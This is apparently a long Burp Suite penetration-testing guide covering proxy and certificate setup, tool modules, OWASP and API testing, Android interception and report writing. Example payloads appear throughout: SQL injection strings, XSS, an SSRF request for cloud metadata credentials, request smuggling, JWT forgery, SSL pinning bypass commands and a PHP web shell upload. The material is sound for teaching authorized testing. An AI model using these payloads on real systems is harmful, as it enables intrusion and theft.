# 🌐 Burp Suite: The Complete Professional Penetration Testing Guide
## From Fundamentals to Advanced Web, API, and Mobile Security Auditing

---

## 📑 Master Table of Contents
1. [Burp Suite Fundamentals & Architecture](#1-burp-suite-fundamentals--architecture)
   - [What is Burp Suite?](#what-is-burp-suite)
   - [Editions Comparison (Community vs. Professional vs. Enterprise)](#editions-comparison)
   - [Intercepting Proxy Mechanics](#intercepting-proxy-mechanics)
   - [Target Scope & Attack Surface Modeling](#target-scope--attack-surface-modeling)
2. [Installation, Configuration & CA Certificates](#2-installation-configuration--ca-certificates)
   - [Installation across Platforms](#installation-across-platforms)
   - [Proxy Listener & Network Interface Binding](#proxy-listener--network-interface-binding)
   - [CA Certificate Installation (Browser, OS & Mobile Stores)](#ca-certificate-installation)
   - [Upstream Proxies & SOCKS Proxy Chaining](#upstream-proxies--socks-proxy-chaining)
   - [Project Files vs. Temporary Projects](#project-files-vs-temporary-projects)
3. [HTTP/HTTPS Protocol Deep Dive for Pentesters](#3-httphttps-protocol-deep-dive-for-pentesters)
   - [HTTP Methods & Idempotency](#http-methods--idempotency)
   - [Request & Response Header Anatomy](#request--response-header-anatomy)
   - [Security Headers & CORS Mechanics](#security-headers--cors-mechanics)
   - [HTTP/1.1 vs. HTTP/2 vs. HTTP/3 in Burp](#http11-vs-http2-vs-http3-in-burp)
4. [Burp Suite Core Modules & Practical Operations](#4-burp-suite-core-modules--practical-operations)
   - [Proxy (Intercept, HTTP History, WebSockets, Match & Replace)](#proxy-module)
   - [Repeater (Manual Request Crafting & Analysis)](#repeater-module)
   - [Intruder (Attack Types, Payloads, Grep Rules & Throttling)](#intruder-module)
   - [Scanner (Active vs. Passive Scanning Engine)](#scanner-module)
   - [Decoder (Encoding, Decoding & Hashing)](#decoder-module)
   - [Comparer (Diffing Responses & Authorization Anomalies)](#comparer-module)
   - [Sequencer (Entropy & Token Randomness Analysis)](#sequencer-module)
   - [Collaborator (Out-of-Band OAST Testing)](#collaborator-module)
   - [Target (Site Map & Scope Definition)](#target-module)
   - [Extensions & BApp Store (Montoya API, Jython & Top Extensions)](#extensions-module)
   - [Logger, Organizer & Session Handling Rules / Macros](#logger-organizer--session-handling-rules)
5. [Web Application & API Security Architecture](#5-web-application--api-security-architecture)
   - [Client-Server Architectural Boundaries](#client-server-architectural-boundaries)
   - [Authentication Architectures (Sessions, Basic, OAuth 2.0, OpenID Connect, JWT)](#authentication-architectures)
   - [Input Validation vs. Output Encoding](#input-validation-vs-output-encoding)
6. [OWASP Top 10 Vulnerability Testing with Burp Suite](#6-owasp-top-10-vulnerability-testing-with-burp-suite)
   - [Broken Access Control (IDOR, BOLA, BFLA, Privilege Escalation)](#broken-access-control)
   - [Cryptographic Failures](#cryptographic-failures)
   - [Injection Flaws (SQLi, NoSQLi, Command Injection, SSTI, CRLF)](#injection-flaws)
   - [Cross-Site Scripting (Reflected, Stored, DOM XSS)](#cross-site-scripting)
   - [Insecure Design & Security Misconfiguration](#insecure-design--security-misconfiguration)
   - [Authentication & Session Weaknesses](#authentication--session-weaknesses)
   - [Server-Side Request Forgery (SSRF & Cloud Metadata)](#server-side-request-forgery)
   - [XML External Entity (XXE) Injection](#xml-external-entity-xxe)
   - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery)
   - [Unrestricted File Upload Vulnerabilities](#unrestricted-file-upload-vulnerabilities)
   - [Business Logic & Race Condition Flaws](#business-logic--race-condition-flaws)
7. [API Security Testing (REST & GraphQL)](#7-api-security-testing-rest--graphql)
   - [REST API Testing Workflow](#rest-api-testing-workflow)
   - [GraphQL Vulnerability Assessment](#graphql-vulnerability-assessment)
   - [JSON Web Token (JWT) Exploitation](#json-web-token-jwt-exploitation)
   - [OAuth 2.0 Implementation Flaws](#oauth-20-implementation-flaws)
   - [OWASP API Security Top 10 (2023) Mapping](#owasp-api-security-top-10-mapping)
8. [Advanced Web Attacks & Exploitation Techniques](#8-advanced-web-attacks--exploitation-techniques)
   - [HTTP Request Smuggling (CL.TE & TE.CL Desynchronization)](#http-request-smuggling)
   - [Web Cache Poisoning & Web Cache Deception](#web-cache-poisoning--web-cache-deception)
   - [Host Header Injection](#host-header-injection)
   - [Race Conditions & Turbo Intruder Synchronization](#race-conditions--turbo-intruder)
   - [WebSocket Security Testing](#websocket-security-testing)
9. [Mobile Application Security Testing with Burp Suite (Android Focus)](#9-mobile-application-security-testing-with-burp-suite)
   - [Configuring Android Devices & Emulators for Burp Proxy](#configuring-android-devices--emulators)
   - [Installing Burp CA to Android System Certificate Store](#installing-burp-ca-to-system-store)
   - [USB Reverse Port Tunneling (`adb reverse`)](#usb-reverse-port-tunneling)
   - [Android Network Security Config Auditing](#android-network-security-config-auditing)
   - [SSL Pinning Detection & Frida / Objection Bypass Workflows](#ssl-pinning-detection--bypass-workflows)
   - [Mobile Backend API & Session Testing](#mobile-backend-api--session-testing)
10. [Professional Pentesting Methodology & Reporting](#10-professional-pentesting-methodology--reporting)
    - [The 11-Phase Web Penetration Testing Methodology](#the-11-phase-methodology)
    - [CVSS v3.1 / v4.0 Scoring Matrix & Severity Levels](#cvss-scoring-matrix)
    - [Professional Vulnerability Report Template](#professional-vulnerability-report-template)
11. [Master Tool Integration & Cheat Sheet](#11-master-tool-integration--cheat-sheet)
    - [Integration with Nmap, SQLMap, JADX, APKTool & MobSF](#integration-with-other-tools)
    - [Essential Keyboard Shortcuts & CLI Flags](#essential-keyboard-shortcuts--cli-flags)
12. [Hands-On Practice Labs & Progressive Learning Roadmap](#12-hands-on-practice-labs--progressive-learning-roadmap)

---

## 1. Burp Suite Fundamentals & Architecture

### What is Burp Suite?
**Burp Suite** (developed by PortSwigger) is the premier integrated workbench for attacking, analyzing, and auditing web applications, APIs, and mobile backends. Operating primarily as a **Man-in-the-Middle (MITM) HTTP/S intercepting proxy**, it sits between the user's client (browser or mobile app) and the target web server, granting the security tester full visibility and granular modification control over every request and response.

```
 ┌──────────────────────┐                    ┌──────────────────────┐                    ┌──────────────────────┐
 │     Client / App     │                    │  Burp Suite (Proxy)  │                    │    Target Server     │
 │                      │  HTTP Request      │  Binds 127.0.0.1:8080│  Forwarded Request │                      │
 │ Browser / Android App│───────────────────▶│  • Intercept         │───────────────────▶│ Backend Web Server   │
 │                      │                    │  • Modify Payload    │                    │ / REST API           │
 │                      │◀───────────────────│  • Analyze Response  │◀───────────────────│                      │
 │                      │  Manipulated Resp  └──────────────────────┘  Raw HTTP Response └──────────────────────┘
 └──────────────────────┘
```

---

### Editions Comparison

| Feature | Community Edition | Professional Edition | Enterprise Edition |
|---|---|---|---|
| **Target Audience** | Beginners, students, hobbyists | Professional pentesters, bug hunters | DevSecOps, corporate CI/CD pipelines |
| **Intercepting Proxy & Repeater** | Yes (Full capability) | Yes (Full capability) | Headless / Agent-driven |
| **Intruder Speed** | Heavily rate-limited / throttled | **Unthrottled high-speed** | Automated engine |
| **Automated Vulnerability Scanner** | No | **Yes (Active & Passive Crawl/Audit)** | Yes (Scheduled enterprise scans) |
| **Burp Collaborator (OAST)** | No (cannot use private OAST) | **Yes (Full Out-of-Band testing)** | Yes |
| **Save / Restore Projects** | No (Temporary sessions only) | **Yes (Encrypted `.burp` project files)** | Yes (Centralized database) |
| **BApp Store Extensions** | Supported (limited by tools) | **Full support (all extensions)** | API-driven integrations |

---

### Intercepting Proxy Mechanics
1. **Request Interception**: The client sends a request. Burp holds it in memory before it reaches the network socket. The tester can inspect headers, rewrite parameters, change cookies, or drop the packet entirely.
2. **Response Interception**: When the server returns data, Burp intercepts the response before the browser/mobile app parses it. The tester can inject XSS test vectors, strip security headers (e.g., CSP, X-Frame-Options), or manipulate server status codes (e.g., turning `401 Unauthorized` into `200 OK` to test client-side authorization bypasses).

---

### Target Scope & Attack Surface Modeling

Defining **Scope** is the most critical operational step in an authorized engagement:
* **In-Scope Rules**: Tell Burp which hosts, protocol schemes, and subpaths are contractually authorized for testing.
* **Out-of-Scope Rules**: Prevent accidental attacks against third-party OAuth providers (Google, Facebook), external CDNs, analytics servers, or payment gateways.
* **Benefits of Proper Scope**:
  * Eliminates clutter in HTTP History.
  * Ensures the Automated Scanner only audits authorized domains.
  * Restricts Intruder and Repeater to permitted systems.

```
 In Scope:     ^https://api\.targetbank\.com:443/.*$
 Out of Scope: .*google-analytics\.com.*
 Out of Scope: .*facebook\.net.*
```

---

## 2. Installation, Configuration & CA Certificates

### Installation across Platforms
Burp Suite requires Java (packaged automatically with official installers):
* **macOS**: DMG installer (Native Apple Silicon ARM64 & Intel x86_64).
* **Linux**: Shell script installer (`sh burpsuite_pro_linux.sh`) or pre-installed in Kali Linux / Parrot OS (`burpsuite`).
* **Windows**: 64-bit EXE installer.

---

### Proxy Listener & Network Interface Binding

By default, Burp binds to loopback interface `127.0.0.1:8080`.
* **Local Browser Testing**: Use `127.0.0.1:8080`.
* **Mobile / Remote Testing**:
  * Navigate to **Proxy** $\rightarrow$ **Proxy settings** $\rightarrow$ **Proxy listeners**.
  * Edit listener $\rightarrow$ Select **All interfaces** or bind specifically to your local Wi-Fi IP address (e.g., `192.168.1.50:8080`).

---

### CA Certificate Installation

Because HTTPS encrypts traffic using TLS, Burp cannot inspect payloads without establishing its own TLS connection to both the client and server. Burp acts as a Certificate Authority, generating dynamic on-the-fly TLS certificates for every target domain.

```
 Client (Browser / Phone) ──[TLS Session 1: Encrypted with Burp CA]──▶ Burp Proxy ──[TLS Session 2: Target CA]──▶ Target Server
```

#### Step 1: Export Burp's Public CA Certificate
1. With Burp running, open a browser pointing to the proxy and visit: **`http://burp`**
2. Click **CA Certificate** (downloads `cacert.der`).

#### Step 2: Install in Browser (Firefox Example)
1. Settings $\rightarrow$ Search **Certificates** $\rightarrow$ **View Certificates**.
2. Authorities tab $\rightarrow$ Click **Import** $\rightarrow$ Select `cacert.der`.
3. Check **"Trust this CA to identify websites"** $\rightarrow$ Click OK.

---

### Upstream Proxies & SOCKS Proxy Chaining

When testing applications behind corporate gateways, Tor, or cloud VPNs:
* Navigate to **Settings** $\rightarrow$ **Network** $\rightarrow$ **Connections**.
* **Upstream Proxy**: Directs Burp's outgoing requests to another HTTP proxy (e.g., corporate gateway at `proxy.corp:8080`).
* **SOCKS Proxy**: Routes traffic through a SOCKS5 proxy (e.g., SSH tunnel or Tor at `127.0.0.1:9050`).

---

## 3. HTTP/HTTPS Protocol Deep Dive for Pentesters

### HTTP Methods & Idempotency

| Method | Idempotent? | Safe? | Pentesting Assessment Focus |
|---|---|---|---|
| **GET** | Yes | Yes | Sensitive parameters leaked in URLs, browser history, referer headers, caching. |
| **POST** | No | No | State-changing operations, CSRF token validation, SQL injection in body, authentication. |
| **PUT** | Yes | No | Arbitrary file upload, overwriting user records, unauthorized resource creation. |
| **PATCH** | No | No | Partial updates, parameter pollution, mass assignment vulnerabilities. |
| **DELETE** | Yes | No | Broken authorization (BOLA/IDOR), deleting other users' assets. |
| **HEAD** | Yes | Yes | Testing response headers without downloading heavy bodies. |
| **OPTIONS**| Yes | Yes | CORS pre-flight auditing, discovering permitted HTTP methods (`Allow` header). |
| **TRACE** | Yes | Yes | Cross-Site Tracing (XST) attacks; reflects cookies through proxies. |

---

### Request & Response Header Anatomy

```http
POST /api/v2/transfer HTTP/1.1
Host: api.targetbank.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json; charset=utf-8
Content-Length: 48
Origin: https://app.targetbank.com
Connection: keep-alive

{"recipient_account": "1049281", "amount": 5000}
```

```http
HTTP/1.1 200 OK
Date: Wed, 04 Nov 2026 15:00:00 GMT
Server: nginx/1.24.0
Content-Type: application/json; charset=utf-8
Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY

{"status": "success", "transaction_id": "TX_99182"}
```

---

### Security Headers & CORS Mechanics

#### Essential Security Headers to Audit:
* **`Strict-Transport-Security` (HSTS)**: Forces modern browsers to use HTTPS exclusively (`max-age=31536000; includeSubDomains; preload`). Missing HSTS allows SSL stripping attacks.
* **`X-Frame-Options`**: Defends against Clickjacking (`DENY` or `SAMEORIGIN`).
* **`Content-Security-Policy` (CSP)**: Restricts script sources to defend against Cross-Site Scripting (XSS).
* **`X-Content-Type-Options: nosniff`**: Prevents MIME-confusion attacks.

#### Cross-Origin Resource Sharing (CORS) Misconfigurations:
When an API receives an `Origin: https://attacker.com` header:
* **Vulnerable Configuration**:
  ```http
  Access-Control-Allow-Origin: https://attacker.com
  Access-Control-Allow-Credentials: true
  ```
  *Impact*: An attacker's malicious web page can issue authenticated AJAX calls and read the victim's private JSON data.

---

## 4. Burp Suite Core Modules & Practical Operations

### Proxy Module
The heart of Burp Suite. Contains:
* **Intercept**: Toggle interception on/off. Use **Action** $\rightarrow$ **Send to Repeater** (`Ctrl+R` / `Cmd+R`) or **Intruder** (`Ctrl+I` / `Cmd+I`).
* **HTTP History**: Logs all requests and responses passing through the proxy. Filterable by status code, search term, MIME type, or scope.
* **WebSockets History**: Inspects bidirectional live socket messaging.
* **Match and Replace**: Automatically transforms headers or bodies on the fly (e.g., automatically replacing `User-Agent` or adding an authorization token).

---

### Repeater Module
The primary manual testing laboratory.
* Allows testers to modify parameters, headers, or methods and reissue requests repeatedly.
* Inspect responses side-by-side in Raw, Pretty, Hex, or Render views.
* **Repeater Tabs & Groups**: Organize requests by functional flow (e.g., "Auth Flow", "Admin Bypass", "SQLi Tests").

---

### Intruder Module
The automated payload delivery engine used for fuzzing, brute-forcing, enumeration, and parameter testing.

```
 ┌────────────────────────────────────────────────────────────────────────┐
 │                      Burp Intruder Attack Types                        │
 ├───────────────────┬────────────────────────────────────────────────────┤
 │ 1. Sniper         │ Single payload set. Iterates through positions     │
 │                   │ one by one. Ideal for fuzzing input fields.        │
 ├───────────────────┼────────────────────────────────────────────────────┤
 │ 2. Battering Ram  │ Single payload set. Places the exact same payload  │
 │                   │ into ALL marked positions simultaneously.          │
 ├───────────────────┼────────────────────────────────────────────────────┤
 │ 3. Pitchfork      │ Multiple payload sets. Moves through sets in       │
 │                   │ parallel (e.g., username 1 + password 1).          │
 ├───────────────────┼────────────────────────────────────────────────────┤
 │ 4. Cluster Bomb   │ Multiple payload sets. Tests every possible        │
 │                   │ permutation (Cartesian product: N x M requests).   │
 └───────────────────┴────────────────────────────────────────────────────┘
```

#### Real-World Intruder Use Cases:
1. **Username Enumeration**: Target login endpoint $\rightarrow$ Payload = Usernames list $\rightarrow$ Grep response length or error message ("User not found" vs "Invalid password").
2. **Predictable IDOR Fuzzing**: Target `GET /api/documents/§100§` $\rightarrow$ Payload = Numbers from 1 to 500 $\rightarrow$ Inspect HTTP 200 responses.

---

### Scanner Module (Burp Pro)
Combines an advanced web crawler with an automated vulnerability audit engine:
* **Passive Scan**: Non-intrusive. Analyzes traffic already passing through the proxy (detects missing security headers, cleartext passwords, cookie flags, software version disclosure).
* **Active Scan**: Sends probe payloads to detect active injection vulnerabilities (SQLi, XSS, SSRF, OS Command Injection).

---

### Decoder Module
Provides bidirectional transformation between common web formats:
* **Encoding / Decoding**: URL, HTML, Base64, ASCII Hex, Hex, Octal, Binary, GZIP.
* **Hashing**: MD5, SHA-1, SHA-256, SHA-384, SHA-512.

---

### Comparer Module
Performs visual word-by-word or byte-by-byte diffs between two requests or responses.
* **Use Case**: Comparing an authorized admin response against an unprivileged user response to detect subtle data leaks or differential error messages.

---

### Sequencer Module
Evaluates the statistical randomness (entropy) of session tokens, CSRF tokens, or password reset tokens.
* Collects sample sets ($10,000+$ tokens) from live requests.
* Executes FIPS 140-2 randomness tests (monobit, poker, runs tests) to determine if tokens are predictable.

---

### Collaborator Module
Enables **Out-of-Band Application Security Testing (OAST)**:
* Detects blind vulnerabilities where the target application does not return output in the HTTP response but makes an external network call to Burp Collaborator's DNS/HTTP server.
* **Detects**: Blind SSRF, Blind XXE, Blind OS Command Injection, Out-of-Band SQLi.

```
 Target Server (Vulnerable to Blind SSRF)
 Parameter: url=http://xyz123.oastify.com
                   │
                   ▼ DNS Lookup & HTTP Request
 ┌─────────────────────────────────────────┐
 │       Burp Collaborator Server          │
 │  Records DNS query & IP from Target     │
 └────────────────────┬────────────────────┘
                      │ Polls for callbacks
                      ▼
 ┌─────────────────────────────────────────┐
 │        Burp Suite Professional          │
 │  Alerts tester: Blind SSRF Confirmed!   │
 └─────────────────────────────────────────┘
```

---

### Extensions & BApp Store (Montoya API)
Burp's functionality expands through Java and Python (Jython) extensions available via the **BApp Store**:

| Extension | Core Purpose in Penetration Testing |
|---|---|
| **Autorize** | Automated authorization testing. Replays requests with low-privilege cookies to instantly detect IDOR / BOLA. |
| **Turbo Intruder** | High-performance HTTP request engine capable of sending 30,000+ requests/second. Essential for race conditions. |
| **Logger++** | Advanced multi-threaded logging with custom filters and regex search capabilities. |
| **JWT Editor** | Decoding, signing, tampering, and forging JSON Web Tokens with automated key-confusion attacks. |
| **Param Miner** | Discovers hidden parameters, unkeyed cache headers, and secret query strings. |
| **HTTP Request Smuggler**| Automates detection and exploitation of HTTP Request Smuggling (CL.TE / TE.CL). |

---

## 5. Web Application & API Security Architecture

### Authentication Architectures

```
 ┌──────────────────┬──────────────────────────────────────────────────────────────────┐
 │ Authentication   │ Security Architecture & Testing Focus                            │
 ├──────────────────┼──────────────────────────────────────────────────────────────────┤
 │ **Cookie-Based** │ Session identifier stored in `Set-Cookie`. Audit `HttpOnly`,     │
 │                  │ `Secure`, and `SameSite` flags. Test session fixation/hijacking. │
 ├──────────────────┼──────────────────────────────────────────────────────────────────┤
 │ **JWT / Bearer** │ Stateless token passed in `Authorization: Bearer <token>`. Audit │
 │                  │ signature algorithms, expiration (`exp`), and secret entropy.    │
 ├──────────────────┼──────────────────────────────────────────────────────────────────┤
 │ **OAuth 2.0**    │ Delegated authorization. Audit `redirect_uri` validation, state  │
 │                  │ parameter CSRF defenses, and authorization code leakage.         │
 ├──────────────────┼──────────────────────────────────────────────────────────────────┤
 │ **API Keys**     │ Static strings in headers (`X-API-Key`). Audit rate limiting     │
 │                  │ and whether keys are exposed in client-side code or URLs.        │
 └──────────────────┴──────────────────────────────────────────────────────────────────┘
```

---

## 6. OWASP Top 10 Vulnerability Testing with Burp Suite

### Broken Access Control (IDOR / BOLA)
Occurs when an application accepts user-supplied input to access objects without validating ownership.

```http
# Original Request (User 101):
GET /api/v1/invoices/101 HTTP/1.1
Authorization: Bearer token_for_user_101

# Tampered Request in Burp Repeater (Targeting User 102):
GET /api/v1/invoices/102 HTTP/1.1
Authorization: Bearer token_for_user_101

# Vulnerability Confirmed if response returns HTTP 200 with User 102's data!
```
* **Testing Tool**: Use **Autorize** to automatically replay all intercepted requests with a second user's session cookies.

---

### SQL Injection (SQLi)
Occurs when untrusted user input is directly concatenated into database queries.

#### Detection in Burp:
```text
# Input Fuzzing Vectors:
' OR '1'='1
' UNION SELECT null, username, password FROM users--
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
```
* Observe syntax error messages in response, timing delays (Time-based blind), or reflected database records (Union-based).

---

### Cross-Site Scripting (XSS)
Occurs when an application includes untrusted data in an HTTP response without proper output encoding.

```http
# Payload in Burp Repeater:
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: target.com
```
* **Reflected XSS**: Payload reflects immediately in response body.
* **Stored XSS**: Payload is persisted in database (comments, profile names) and executes when other users view the page.
* **DOM XSS**: Unsafe JavaScript execution sinks (`element.innerHTML`, `eval()`).

---

### Server-Side Request Forgery (SSRF)
Abusing a server-side functionality to force the backend server to make unauthorized HTTP requests to internal resources or cloud metadata services.

```http
POST /api/generate-pdf HTTP/1.1
Host: target.com
Content-Type: application/json

{"source_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```
* **Impact**: Extraction of AWS/GCP cloud metadata credentials, pivoting into private internal subnets (`http://192.168.1.1/admin`).
* **Testing Blind SSRF**: Inject Burp Collaborator payload (`http://xyz.oastify.com`) and monitor for DNS callbacks.

---

## 7. API Security Testing (REST & GraphQL)

### REST API Testing Workflow
Modern web and mobile architectures communicate via JSON/REST APIs:
1. **Analyze API Endpoints**: Examine method tampering (e.g., changing `GET /api/users` to `DELETE /api/users`).
2. **Parameter Fuzzing**: Test hidden parameters using **Param Miner**.
3. **Mass Assignment**: Inject administrative attributes into JSON bodies:
   ```json
   {
     "username": "attacker",
     "email": "attacker@mail.com",
     "is_admin": true,
     "role": "administrator"
   }
   ```

---

### GraphQL Vulnerability Assessment
GraphQL replaces multiple REST endpoints with a single query endpoint (`/graphql`):

#### 1. Introspection Query Abuse:
If introspection is enabled, an attacker can extract the entire backend database schema, queries, mutations, and field definitions:
```graphql
# Introspection Query payload in Burp Repeater:
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "{__schema{types{name,fields{name}}}}"}
```

#### 2. Query Depth & Complexity Denial of Service (DoS):
```graphql
query {
  user {
    friends {
      friends {
        friends {
          friends {
            name
          }
        }
      }
    }
  }
}
```

---

### JSON Web Token (JWT) Exploitation
JWTs consist of three Base64URL-encoded segments separated by dots:
$$\text{Header} \ . \ \text{Payload} \ . \ \text{Signature}$$

#### Common JWT Attacks Tested in Burp:
1. **The `none` Algorithm Flaw**:
   Change algorithm in header to `"none"` (`{"alg": "none", "typ": "JWT"}`) and strip the signature segment. If accepted, arbitrary administrative roles can be forged.
2. **Weak Secret Brute-Forcing**:
   Use hashcat or Burp JWT Editor to crack weak HMAC-SHA256 secrets (`password123`, `secret`).
3. **Algorithm Confusion (RS256 to HS256)**:
   If the server expects RSA (RS256) with a public key, re-sign the token using the server's public key as an HMAC (HS256) secret key.

---

## 8. Advanced Web Attacks & Exploitation Techniques

### HTTP Request Smuggling (CL.TE & TE.CL Desynchronization)
Occurs when frontend reverse proxies and backend servers disagree on request boundaries due to ambiguities between `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) headers:

```
 ┌──────────────────────┐                    ┌──────────────────────┐
 │    Frontend Proxy    │                    │    Backend Server    │
 │ Uses: Content-Length │                    │ Uses: Transfer-Enc   │
 └──────────┬───────────┘                    └──────────▲───────────┘
            │                                           │
            └────────── Desynchronization ──────────────┘
```

#### CL.TE Smuggling Payload:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
* The frontend forwards the entire request based on `Content-Length`.
* The backend stops processing at `0` (end of chunk), leaving `SMUGGLED` in the pipeline buffer to prepend to the next user's incoming request!

---

### Race Conditions & Turbo Intruder Synchronization
Occurs when multiple concurrent requests attempt to execute an operation before the database commits a state change.

#### Turbo Intruder Script (Multi-request Race Synchronization):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)

    # Queue 20 identical redemption requests simultaneously
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Release all requests at the exact same millisecond
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 9. Mobile Application Security Testing with Burp Suite (Android Focus)

### Configuring Android Devices & Emulators for Burp Proxy

```
 Android Phone / Emulator (192.168.1.105) ──▶ Burp Proxy (192.168.1.50:8080) ──▶ Target API Server
```

#### Method A: Wi-Fi Manual Proxy
* In Android Wi-Fi settings $\rightarrow$ Modify Network $\rightarrow$ Advanced $\rightarrow$ Proxy: **Manual**.
* Proxy Hostname: Host machine IP (e.g., `192.168.1.50`).
* Proxy Port: `8080`.

#### Method B: USB Reverse Port Forwarding (No Wi-Fi Proxy Needed!)
Connect phone via USB with USB Debugging enabled:
```bash
# Routes all device connections to 127.0.0.1:8080 directly into Burp on host!
adb reverse tcp:8080 tcp:8080
```

---

### Installing Burp CA to Android System Certificate Store

Starting with Android 7.0 (Nougat / API 24), Android applications **reject user-installed certificates** by default. Pentesters must push Burp's CA into the **System Certificate Store** (`/system/etc/security/cacerts/`).

```bash
# Step 1: Export Burp certificate in DER format (cacert.der)

# Step 2: Convert DER to PEM format
openssl x509 -inform DER -in cacert.der -out burp.pem

# Step 3: Calculate subject hash (old hash format for Android)
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -n 1)
# Example output: 9a5ba575

# Step 4: Rename certificate to <HASH>.0
mv burp.pem ${HASH}.0

# Step 5: Mount system as writable and push certificate to Android System Store
adb root
adb remount
adb push ${HASH}.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/${HASH}.0
adb reboot
```

---

### SSL Pinning Detection & Bypass Workflows

Even with a system certificate installed, applications using **SSL Pinning** (e.g., OkHttp `CertificatePinner`, TrustKit) validate the server's public key directly in code and abort execution when Burp intercepts the session.

#### Bypassing SSL Pinning via Objection:
```bash
objection -g com.target.bank explore
# Inside Objection interactive console:
android sslpinning disable
```

#### Bypassing SSL Pinning via Frida Dynamic Hooking:
```bash
frida -U -f com.target.bank -l bypass_ssl_pinning.js --no-pause
```

---

## 10. Professional Pentesting Methodology & Reporting

### The 11-Phase Web Penetration Testing Methodology

```
 ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
 │ 1. Recon     │───▶│ 2. Scope     │───▶│ 3. Mapping   │───▶│ 4. Analyze   │
 │ Target OSINT │    │ In/Out bounds│    │ Target Tree  │    │ Components   │
 └──────────────┘    └──────────────┘    └──────────────┘    └──────┬───────┘
                                                                    │
 ┌──────────────┐    ┌──────────────┐    ┌──────────────┐           │
 │ 8. Exploit   │◀───│ 7. Assess    │◀───│ 6. Authz     │◀──────────┘
 │ Proof-of-Conc│    │ Vulnerability│    │ Testing (IDOR│
 └──────┬───────┘    └──────────────┘    └──────────────┘
        │
        ▼
 ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
 │ 9. Impact    │───▶│ 10. Report   │───▶│ 11. Retest   │
 │ CVSS Scoring │    │ Remediation  │    │ Validate Fix │
 └──────────────┘    └──────────────┘    └──────────────┘
```

---

### Professional Vulnerability Report Template

```markdown
### [CRITICAL] Remote Code Execution via Insecure File Upload
* **Vulnerability ID**: VULN-WEB-001
* **CVSS v3.1 Score**: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
* **CWE Mapping**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
* **OWASP Category**: A03:2021 - Injection

#### Description:
The avatar upload endpoint at `/api/v1/profile/avatar` fails to restrict file extensions or validate MIME types on the server side. An unauthenticated attacker can upload a web shell executable by the backend web server.

#### Proof of Concept:
1. Intercept avatar upload in Burp Suite.
2. Modify filename to `shell.php` with payload:
   ```http
   POST /api/v1/profile/avatar HTTP/1.1
   Host: target.com
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

   ------WebKitFormBoundary
   Content-Disposition: form-data; name="avatar"; filename="shell.php"
   Content-Type: application/x-php

   <?php system($_GET['cmd']); ?>
   ------WebKitFormBoundary--
   ```
3. Execute arbitrary OS commands:
   `https://target.com/uploads/shell.php?cmd=id`
   `Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)`

#### Business Impact:
Complete compromise of the underlying application server, full database exfiltration, and lateral movement across internal cloud VPC networks.

#### Remediation:
1. Re-encode uploaded images on the server side using image processing libraries (e.g., Pillow, ImageMagick) to strip malicious executable code.
2. Store uploaded assets in an isolated object storage bucket (e.g., AWS S3) with public script execution disabled.
3. Enforce a strict whitelist of allowed file extensions (`.png`, `.jpg`, `.jpeg`).
```

---

## 11. Master Tool Integration & Cheat Sheet

### Integration with Other Security Tools
* **Burp + SQLMap**:
  Right-click any request in Burp $\rightarrow$ **Save item** $\rightarrow$ Pass directly to SQLMap:
  ```bash
  sqlmap -r request.txt --batch --dbs
  ```
* **Burp + JADX / APKTool**:
  Trace API calls intercepted in Burp back to decompiled Java classes in JADX to inspect client-side hashing, encryption keys, and custom headers.

---

### Essential Keyboard Shortcuts

| Shortcut (macOS) | Shortcut (Windows/Linux) | Action |
|---|---|---|
| `Cmd + R` | `Ctrl + R` | Send request to **Repeater** |
| `Cmd + I` | `Ctrl + I` | Send request to **Intruder** |
| `Cmd + U` | `Ctrl + U` | URL encode / decode selected text |
| `Cmd + B` | `Ctrl + B` | Base64 encode / decode selected text |
| `Cmd + F` | `Ctrl + F` | Search within request / response |
| `Cmd + Shift + P` | `Ctrl + Shift + P` | Forward intercepted request |
| `Cmd + Shift + D` | `Ctrl + Shift + D` | Drop intercepted request |

---

## 12. Hands-On Practice Labs & Progressive Learning Roadmap

### Progressive 4-Tier Learning Path
1. **Tier 1 (Foundations)**: Setup Burp, install CA certificates, intercept HTTP/S, practice manual editing in Repeater, use Decoder.
2. **Tier 2 (Core OWASP Vulnerabilities)**: Solve PortSwigger Academy labs on SQL Injection, XSS, CSRF, and IDOR using Intruder and Comparer.
3. **Tier 3 (APIs & Mobile Auditing)**: Connect Android devices, install System CA certs, bypass SSL pinning with Frida, test REST & GraphQL APIs.
4. **Tier 4 (Advanced Exploitation & Research)**: Master HTTP Request Smuggling, Turbo Intruder race conditions, Web Cache Poisoning, and Montoya API extension development.
